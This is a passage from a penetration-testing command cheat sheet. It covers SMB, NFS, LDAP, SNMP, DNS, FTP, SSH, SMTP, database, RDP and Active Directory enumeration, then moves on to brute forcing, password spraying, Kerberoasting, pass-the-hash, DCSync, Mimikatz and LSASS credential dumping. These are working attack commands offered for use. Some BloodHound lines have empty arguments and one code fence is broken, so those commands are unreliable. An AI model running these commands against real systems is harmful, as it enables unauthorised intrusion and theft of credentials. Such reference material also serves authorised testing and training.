# Check for EternalBlue (MS17-010) vulnerability
nmap -p 445 --script smb-vuln-ms17-010 <RHOST>

# Check for MS08-067 (NetAPI) SMB vulnerability
nmap -p 445 --script smb-vuln-ms08-067 <RHOST>

# Check for CVE-2017-7494 (Samba remote code execution via writable share)
nmap -p 445 --script smb-vuln-cve-2017-7494 <RHOST>

# Check for all SMB vulnerabilities
nmap -p 139,445 --script smb-vuln* <RHOST>

# Check signing (Nmap)
nmap -p 445 --script smb-security-mode <RHOST>

# Check signing (NetExec)
nxc smb <RHOST> --gen-relay-list relay.txt
```

---

## 6. NFS Enumeration

### 6.1 Detect RPC/NFS and list exports

```bash
# Scan common RPC/NFS ports and run rpcinfo NSE
nmap -p 111,2049,32769 --script rpcinfo <RHOST> -oA nmap_rpc_<RHOST>

# List RPC programs/versions/ports via portmapper
rpcinfo -p <RHOST>

# Quick RPC reachability/info check
rpcinfo <RHOST>

# List exported NFS filesystems
showmount -e <RHOST>

# Show clients and their mount points (if exposed)
showmount -a <RHOST>  

# Show only export directory names
showmount -d <RHOST>  

# Run NFS NSE scripts (list, exports, filesystem stats)
nmap -p 111 --script nfs-ls,nfs-showmount,nfs-statfs <RHOST>
```

### 6.2 Mount shares and verify access

```bash
# Create a local mount point directory
sudo mkdir -p /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount the NFS export with default settings
sudo mount -t nfs <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount forcing NFSv3 and disabling locking (common for compatibility)
sudo mount -t nfs -o nolock,vers=3 <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount forcing NFSv2 (legacy targets)
sudo mount -t nfs -o nolock,vers=2 <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Confirm mounts and usage
df -h | grep nfs

# Confirm active NFS mounts (mount table)
mount | grep nfs
```

### 6.3 Search for sensitive data

```bash
# Basic listing
ls -la /mnt/nfs/<RHOST>/<SHARE_NAME>/

```bash
# Find sensitive file types
find /mnt/nfs/<RHOST>/<SHARE_NAME> \
  -name "*.pem" -o -name "*.key" -o -name "*.sql" -o -name "*.db" \
  -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null

# Find SSH keys
find /mnt/nfs/<RHOST>/<SHARE_NAME> -name "id_rsa*" -o -name "id_dsa*" -o -name "known_hosts" 2>/dev/null
```
```bash
# Find password files
find /mnt/nfs/<RHOST>/<SHARE_NAME> -name "*pass*" -o -name "*cred*" 2>/dev/null
```
```bash
# Grep for credentials
grep -rniE "password|passwd|pwd|secret|token|key" /mnt/nfs/<RHOST>/<SHARE_NAME>/ 2>/dev/null
```
```bash
# Find world-readable files
find /mnt/nfs/<RHOST>/<SHARE_NAME> -perm -004 -type f 2>/dev/null
```
```bash
# Find SUID binaries (for privesc)
find /mnt/nfs/<RHOST>/<SHARE_NAME> -perm -4000 -type f 2>/dev/null
```

### 6.4 no_root_squash / export misconfig checks

```bash
# Test if root_squash is disabled
sudo touch /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash
ls -la /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash

# If file is owned by root, no_root_squash is enabled (critical finding)
# Clean up
sudo rm /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash

# Unmount when done
sudo umount /mnt/nfs/<RHOST>/<SHARE_NAME>
```

---

## 7. LDAP/Directory Services Discovery

### 7.1 RootDSE and naming contexts

```bash
# Anonymous bind - base info
ldapsearch -x -h <RHOST> -s base
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -x -H ldap://<RHOST> -s base

# Get supported controls
ldapsearch -x -h <RHOST> -s base supportedControl

# Get supported extensions
ldapsearch -x -h <RHOST> -s base supportedExtension

# Nmap LDAP scripts
nmap -p 389,636 --script ldap-rootdse <RHOST>
nmap -p 389,636 --script ldap-search <RHOST>
```

### 7.2 Users / groups / computers

Adjust base DN from naming contexts discovered above.

```bash
# Enumerate users
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=user)" sAMAccountName mail description memberOf
```
```bash
# Enumerate groups
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=group)" cn member description
```
```bash
# Enumerate computers
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=computer)" name operatingSystem operatingSystemVersion
```
```bash
# Get all objects
ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*"
```
```bash
# Extract all DNs
ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*" | awk '/dn: / {print $2}'
```
```bash
# With credentials
ldapsearch -x -H ldap://<RHOST> -D "<USER>@<DOMAIN>" -w '<PASS>' -b "DC=<DOMAIN>,DC=local" "(objectClass=user)"
```

**Using ldapdomaindump:**

```bash
# Dump AD LDAP domain objects using creds, target as host (defaults to LDAP)
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <RHOST>

# Dump AD LDAP domain objects using creds, target explicitly via LDAP URI
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<RHOST>
```

### 7.3 DC / domain role confirmation

Look for:

- SRV records in DNS
- LDAP `rootDomainNamingContext`
- Ports 53/88/389/445/464/636/3268 patterns
- OS banners

```bash
# Check for domain controller ports
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 <RHOST>

# DNS SRV records for DC #1
dig _ldap._tcp.<DOMAIN> SRV

# DNS SRV records for DC #2
dig _kerberos._tcp.<DOMAIN> SRV
```

---

## 8. SNMP Enumeration

### 8.1 Community discovery

```bash
# Onesixtyone community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <RHOST>

# Multiple hosts
onesixtyone -c community.txt -i hosts.txt

# snmp-check (public)
snmp-check <RHOST> -c public

# snmp-check (private)
snmp-check <RHOST> -c private

# Nmap SNMP brute force
nmap -sU -p 161 --script snmp-brute <RHOST>
```

### 8.2 Walk important OIDs

```bash
# SNMP walk version 1
snmpwalk -v1 -c public <RHOST>

# SNMP walk version 2c
snmpwalk -v2c -c public <RHOST>

# SNMP walk entire MIB tree
snmpwalk -v2c -c public <RHOST> .1

# System information OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1

# Network interfaces OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.2.2 

# Running processes OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.4.2.1.2

# Host resources OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.1

# Installed software OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.6.3.1.2 

# Windows user accounts OID
snmpwalk -v1 -c public <RHOST> 1.3.6.1.4.1.77.1.2.25

# Windows domain OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.4.1.77.1.4.1

# Extended enumeration with snmp-check
snmp-check -v2c -c public <RHOST> -w

# Bulk get for faster enumeration
snmpbulkwalk -v2c -c public <RHOST>
```

**Extract specific info:**

```bash
# Get hostname
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.5.0

# Get system description
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.1.0

# Get uptime
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.3.0
```

---

## 9. DNS Enumeration

### 9.1 Zone transfers

```bash
# Get nameservers using dig
dig ns <DOMAIN> @<DNS_SERVER> +short

# Get nameservers using Cloudflare DNS
dig ns <DOMAIN> @1.1.1.1 +short

# Get nameservers using host
host -t ns <DOMAIN>

# Attempt zone transfer with dig
dig axfr <DOMAIN> @<NS_SERVER>

# Attempt zone transfer alternate syntax
dig axfr @<DNS_SERVER> <DOMAIN>

# Attempt zone transfer with host
host -l <DOMAIN> <NS_SERVER>

# Loop through all nameservers for zone transfer
for ns in $(dig ns <DOMAIN> +short); do
  echo "Trying AXFR against $ns"
  dig axfr <DOMAIN> @$ns
done

# Zone transfer using dnsrecon
dnsrecon -d <DOMAIN> -t axfr
```

### 9.2 Subdomain enumeration

**Wordlist brute force:**

```bash
# Gobuster DNS enumeration
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -o dns_gobuster_<DOMAIN>.txt

# DNSrecon brute force
dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

# Fierce subdomain scanner
fierce --domain <DOMAIN>

# Fierce with custom DNS server
fierce --domain <DOMAIN> --dns-servers <DNS_SERVER>

# Wfuzz DNS fuzzing
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://<DOMAIN>" -H "Host: FUZZ.<DOMAIN>" --hc 404
```

**OSINT/passive:**

```bash
# Sublist3r passive enumeration
sublist3r -d <DOMAIN> -o subdomains_<DOMAIN>.txt

# Amass passive enumeration
amass enum -passive -d <DOMAIN> -o amass_passive.txt

# DNSrecon comprehensive scan
dnsrecon -d <DOMAIN> -a -z -s -b -r 8.8.8.8
```

### 9.3 Record sweep

```bash
# Query all common DNS record types
for type in A AAAA MX TXT SOA NS SRV CNAME PTR; do
  echo "=== $type ==="
  dig $type <DOMAIN> +short
done

# Query all record types
dig <DOMAIN> ANY +noall +answer

# Get MX records
dig <DOMAIN> MX +short

# Get TXT records
dig <DOMAIN> TXT +short

# Get MX records with host
host -t mx <DOMAIN>

# Get TXT records with host
host -t txt <DOMAIN>

# Reverse DNS lookup
dig -x <IP_ADDRESS>

# Reverse DNS with host
host <IP_ADDRESS>

# Check SPF record
dig txt <DOMAIN> | grep "v=spf"

# Check DMARC record
dig txt _dmarc.<DOMAIN>
```

---

## 10. FTP Enumeration

### 10.1 Anonymous login check

```bash
# Automated anonymous login check with nmap
nmap -p 21 --script ftp-anon <RHOST>

# Anonymous login with lftp
lftp <RHOST>
```

### 10.2 Version and vulnerability check

```bash
# Banner grab with netcat
nc -nv <RHOST> 21

# Version detection with nmap
nmap -sV -p 21 <RHOST>

# FTP enumeration scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <RHOST>

# FTP vulnerability scan
nmap -p 21 --script ftp-vuln* <RHOST>

# Search for vsftpd exploits
searchsploit vsftpd

# Search for proftpd exploits
searchsploit proftpd
```

### 10.3 File enumeration

```bash
# Recursive download with wget
wget -r ftp://anonymous:anonymous@<RHOST>/

# Mirror FTP directory
wget -m --no-passive ftp://anonymous:anonymous@<RHOST>/
```

---

## 11. SSH Enumeration

### 11.1 Version and algorithm enumeration

```bash
# SSH banner grab with netcat
nc -nv <RHOST> 22

# SSH banner grab with telnet
telnet <RHOST> 22

# SSH version detection
nmap -sV -p 22 <RHOST>

# Enumerate SSH algorithms
nmap -p 22 --script ssh2-enum-algos <RHOST>

# Get SSH host key
nmap -p 22 --script ssh-hostkey <RHOST>

# SSH key scan
ssh-keyscan <RHOST>
```

### 11.2 Authentication methods

```bash
# Check authentication methods
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <RHOST>

# Verbose authentication check
ssh -v <RHOST> 2>&1 | grep "Authentications that can continue"

# Nmap authentication methods scan
nmap -p 22 --script ssh-auth-methods <RHOST>

# Public key acceptance test
nmap -p 22 --script ssh-publickey-acceptance <RHOST>
```

### 11.3 Brute force (if applicable)

```bash
# Hydra SSH single user
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>

# Hydra SSH user and password lists
hydra -L users.txt -P passwords.txt ssh://<RHOST> -t 4

# Medusa SSH brute force
medusa -h <RHOST> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh

# NetExec SSH brute force
nxc ssh <RHOST> -u <USER> -p /usr/share/wordlists/rockyou.txt
```

---

## 12. SMTP Enumeration

### 12.1 User enumeration

```bash
# SMTP connection with netcat
nc -nv <RHOST> 25

# SMTP connection with telnet
telnet <RHOST> 25

# SMTP enumeration scripts
nmap -p 25 --script smtp-commands,smtp-enum-users <RHOST>

# SMTP user enumeration with multiple methods
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <RHOST>

# SMTP user enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>

# SMTP user enum with EXPN
smtp-user-enum -M EXPN -U users.txt -t <RHOST>

# SMTP user enum with RCPT
smtp-user-enum -M RCPT -U users.txt -D <DOMAIN> -t <RHOST>
```

### 12.2 Open relay check

```bash
# Nmap open relay check
nmap -p 25 --script smtp-open-relay <RHOST>
```

---

## 13. POP3/IMAP Enumeration

### 13.1 Banner and capabilities

```bash
# POP3 connection with netcat
nc -nv <RHOST> 110

# POP3 connection with telnet
telnet <RHOST> 110

# POP3S secure connection
openssl s_client -connect <RHOST>:995 -quiet

# IMAP connection with netcat
nc -nv <RHOST> 143

# IMAP connection with telnet
telnet <RHOST> 143

# IMAPS secure connection
openssl s_client -connect <RHOST>:993 -quiet

# Nmap POP3/IMAP capabilities
nmap -p 110,143,993,995 --script pop3-capabilities,imap-capabilities <RHOST>
```

### 13.2 Authentication and enumeration

```bash
# Hydra POP3 brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <RHOST> pop3

# Hydra IMAP brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <RHOST> imap
```

---

## 14. RPC Enumeration

### 14.1 RPC service enumeration

```bash
# List RPC services detailed
rpcinfo -p <RHOST>

# List RPC services
rpcinfo <RHOST>

# Nmap RPC enumeration
nmap -p 111 --script rpcinfo <RHOST>

# Nmap RPC with version detection
nmap -sV -p 111 --script=rpcinfo <RHOST>
```

### 14.2 RPC client enumeration

```bash
# Connect with null session
rpcclient -U "" -N <RHOST>

# Enumerate domain users one-liner
rpcclient -U "" <RHOST> -N -c "enumdomusers" 2>/dev/null

# Enumerate domain groups one-liner
rpcclient -U "" <RHOST> -N -c "enumdomgroups" 2>/dev/null

# RPC enumeration with credentials
rpcclient -U '<USER>%<PASS>' <RHOST> -c "enumdomusers"
```

---

## 15. Database Enumeration

### 15.1 MSSQL enumeration

```bash
# Nmap MSSQL info script
nmap -p 1433 --script ms-sql-info <RHOST>

# Nmap MSSQL config script
nmap -p 1433 --script ms-sql-config <RHOST>

# Nmap MSSQL empty password check
nmap -p 1433 --script ms-sql-empty-password <RHOST>

# Nmap MSSQL NTLM info
nmap -p 1433 --script ms-sql-ntlm-info <RHOST>

# Nmap MSSQL brute force
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <RHOST>

# Impacket mssqlclient Windows auth
impacket-mssqlclient <USER>@<RHOST> -windows-auth

# Impacket mssqlclient with credentials
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<RHOST>

# sqsh MSSQL client
sqsh -S <RHOST> -U <USER> -P <PASS>

# NetExec MSSQL authentication
nxc mssql <RHOST> -u <USER> -p <PASS>

# NetExec MSSQL query execution
nxc mssql <RHOST> -u <USER> -p <PASS> -q "SELECT name FROM master.dbo.sysdatabases"
```

### 15.2 MySQL enumeration

```bash
# MySQL connection with password
mysql -h <RHOST> -u root -p

# MySQL connection without password
mysql -h <RHOST> -u root

# Nmap MySQL info script
nmap -p 3306 --script mysql-info <RHOST>

# Nmap MySQL empty password check
nmap -p 3306 --script mysql-empty-password <RHOST>

# Nmap MySQL enumeration
nmap -p 3306 --script mysql-enum <RHOST>

# Nmap MySQL brute force
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <RHOST>
```

### 15.3 PostgreSQL enumeration

```bash
# PostgreSQL connection
psql -h <RHOST> -U <USER> -d <DATABASE>

# Nmap PostgreSQL brute force
nmap -p 5432 --script pgsql-brute <RHOST>
```

---

## 16. RDP/VNC Enumeration

### 16.1 RDP enumeration

```bash
# Nmap RDP encryption enumeration
nmap -p 3389 --script rdp-enum-encryption <RHOST>

# Nmap RDP NTLM info
nmap -p 3389 --script rdp-ntlm-info <RHOST>

# Nmap RDP MS12-020 vulnerability check
nmap -p 3389 --script rdp-vuln-ms12-020 <RHOST>

# RDP connection with rdesktop
rdesktop <RHOST>

# RDP connection with xfreerdp
xfreerdp /v:<RHOST> /u:<USER> /p:<PASS>

# RDP connection ignoring certificate
xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> /cert:ignore

# Hydra RDP brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<RHOST>

# NetExec RDP brute force
nxc rdp <RHOST> -u <USER> -p /usr/share/wordlists/rockyou.txt
```

### 16.2 VNC enumeration

```bash
# Nmap VNC info script
nmap -p 5900 --script vnc-info <RHOST>

# Nmap VNC brute force
nmap -p 5900 --script vnc-brute <RHOST>

# VNC connection with display
vncviewer <RHOST>:<DISPLAY>

# VNC connection on port 5900
vncviewer <RHOST>::5900

# Hydra VNC brute force
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<RHOST>
```

---

### 17.1 Domain Enumeration

#### Linux
```bash
# Basic domain info
nxc smb <DC_IP>
nxc smb <DC_IP> --pass-pol

# LDAP enumeration
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local'

# Domain SID
rpcclient -U '<USER>%<PASS>' <DC_IP> -c "lsaquery"
impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Find domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
```

#### Windows
```powershell
# PowerShell
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *
Get-ADTrust -Filter *
Get-ADDefaultDomainPasswordPolicy

# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainTrust
Get-DomainPolicy
```

---

### 17.2 User and Group Enumeration

#### Linux
```bash
# Enumerate users
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --users
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --rid-brute
impacket-GetADUsers -all '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# Enumerate groups
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --groups
rpcclient -U '<USER>%<PASS>' <DC_IP> -c "enumdomgroups"

# Find privileged users
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(adminCount=1)' sAMAccountName

# Enum4linux
enum4linux -a <DC_IP>
enum4linux -u '<USER>' -p '<PASS>' -a <DC_IP>
```

#### Windows
```powershell
# PowerShell
Get-ADUser -Filter * | Select Name,SamAccountName,Enabled
Get-ADUser -Filter {adminCount -eq 1}
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember "Domain Admins" -Recursive

# PowerView
Get-DomainUser
Get-DomainUser | Select samaccountname,description,pwdlastset
Get-DomainUser -AdminCount
Get-DomainUser -SPN  # Kerberoastable users
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainComputer
Get-DomainComputer -Ping
```

---

### 17.3 Kerberos Enumeration

#### Linux
```bash
# User enumeration
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt

# Password spray
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

# AS-REP roasting (no creds)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat

# AS-REP roasting (with creds)
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request

# Kerberoasting
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# Get TGT
impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
```

#### Windows
```powershell
# Rubeus AS-REP roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Rubeus Kerberoasting
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | fl
Get-DomainUser -SPN | Invoke-Kerberoast

# Find AS-REP roastable users
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
Get-DomainUser -PreauthNotRequired

# Find Kerberoastable users
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}
setspn -Q */*
```

---

### 17.4 Share Enumeration

#### Linux
```bash
# Basic share enum
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares
nxc smb <NETWORK>/24 -u '<USER>' -p '<PASS>' --shares

# Spider shares
nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus

# SMBMap
smbmap -H <RHOST> -u '<USER>' -p '<PASS>'
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R <SHARE>

# SMBClient
smbclient -L //<RHOST> -U '<USER>%<PASS>'
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
```

#### Windows
```powershell
# Native
net view \\<HOSTNAME>
dir \\<HOSTNAME>\<SHARE>

# PowerView
Invoke-ShareFinder
Invoke-ShareFinder -CheckShareAccess
Invoke-FileFinder
Find-InterestingDomainShareFile

# Find sensitive files
Get-ChildItem -Path "\\<HOSTNAME>\<SHARE>" -Recurse -Include *.txt,*.xml,*.config,*.ini,*.kdbx
```

---

### 17.5 BloodHound / SharpHound
[Quick Start BloodHound CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

#### Linux - BloodHound Python
```bash
# All collection
bloodhound-python -c All -u '' -p '' -d  -dc  -ns 
# DC only (faster)
bloodhound-python -c DCOnly -u '' -p '' -d  -dc  -ns 
# Specific collections
bloodhound-python -c Group,LocalAdmin,Session,Trusts -u '' -p '' -d  -ns 
```

#### Windows - SharpHound
```powershell
# Standard collection (JSON output for CE)
.\SharpHound.exe -c All --outputdirectory C:\Temp
# Fast collection (no session enumeration)
.\SharpHound.exe -c DCOnly
# Specific collection methods
.\SharpHound.exe -c Session,LoggedOn
.\SharpHound.exe -c Group,LocalAdmin,Trusts
# Loop collection (for sessions)
.\SharpHound.exe -c All --Loop --Loopduration 02:00:00
# Stealth collection
.\SharpHound.exe -c All --Stealth
# Domain specification
.\SharpHound.exe -c All -d  --outputdirectory C:\Temp
```


#### PowerView ACL Analysis
```powershell
# Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs

# Get ACL for specific user
Get-DomainObjectAcl -SamAccountName <USER> -ResolveGUIDs

# Find GenericAll/WriteDacl/WriteOwner permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# Find DCSync rights
Get-DomainObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectType -match "replication"}

# Find who can modify GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"}
```

---

### 17.6 Credential Dumping

#### Linux
```bash
# Dump SAM/LSA
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --lsa

# Dump NTDS (Domain Controller)
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --ntds

# Secretsdump
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Pass-the-hash
nxc smb <RHOST> -u '<USER>' -H '<NTLM_HASH>'
impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<RHOST>
```

#### Windows
```powershell
# Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

# DCSync attack
lsadump::dcsync /domain:<DOMAIN> /user:<USER>

# Dump LSASS
procdump.exe -ma lsass.exe lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# SafetyKatz (obfuscated Mimikatz)
.\SafetyKatz.exe
```
